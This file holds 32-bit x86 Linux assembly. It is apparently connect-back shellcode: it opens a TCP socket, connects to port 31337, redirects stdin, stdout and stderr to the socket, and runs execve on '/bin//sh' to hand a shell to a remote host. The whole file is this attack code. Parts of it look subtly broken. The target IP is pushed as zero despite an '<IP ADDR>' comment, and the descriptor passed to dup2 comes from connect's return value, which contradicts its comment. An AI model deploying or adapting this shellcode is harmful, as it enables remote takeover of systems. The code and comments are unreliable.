BITS 32

; s = socket(2, 1, 0)
    push BYTE 0x66
    pop eax
    cdq                     ; Zero out edx for use as a null DWORD later
    xor ebx, ebx
    inc ebx                 ; 1 = SYS_SOCKET = socket()
    push edx                ; Build arg array: { protocol = 0,
    push BYTE 0x1           ;                    SOCK_STREAM = 1,
    push BYTE 0x2           ;                    AF_INET = 2 }
    mov ecx, esp            ; ecx = ptr to argument array
    int 0x80

    xchg esi, eax           ; Save socket FD in esi for later

; connect(s, [2, 31337, <IP ADDR>], 16)
    push BYTE 0x66
    pop eax
    inc ebx                 ; ebx = 2 (needed for AF_INET)
    push edx                ; Build sockaddr struct: IP = INADDR_ANY
    push WORD 0x697a        ;                        Port = 31337
    push WORD bx            ;                        AF_INET = 2
    mov ecx, esp            ; ecx = server struct ptr
    push BYTE 16            ; argv: { sizeof(server struct) = 16
    push ecx                ;         server struct ptr,
    push esi                ;         socket fd }
    mov ecx, esp            ;
    inc ebx                 ; ebx = 3 = SYS_CONNECT = connect()
    int 0x80

; dup2(connected socket, {all 3 I/O fds})
    xchg eax, ebx           ; Put socket Fd in ebx, and 0x00000003 in EAX
    push BYTE 0x02          ; ecx starts at 2
    pop ecx
dup_loop:
    mov BYTE al, 0x3F
    int 0x80
    dec ecx 
    jns dup_loop 

; execve(const char *fname, char *const argv [], char *const envp[])
    mov BYTE al, 11
    push edx                ; Push some nulls for string termination
    push 0x68732f2f         ; "//sh"
    push 0x6e69622f         ; "/bin"
    mov ebx, esp            ; Put the address oif "/bin//sh" into ebx
    push edx
    mov edx, esp            ; Empty array for envp
    push ebx                ; push string addr to stack above NULL terminator
    mov ecx, esp            ; This is the argv array with string ptr 
    int 0x80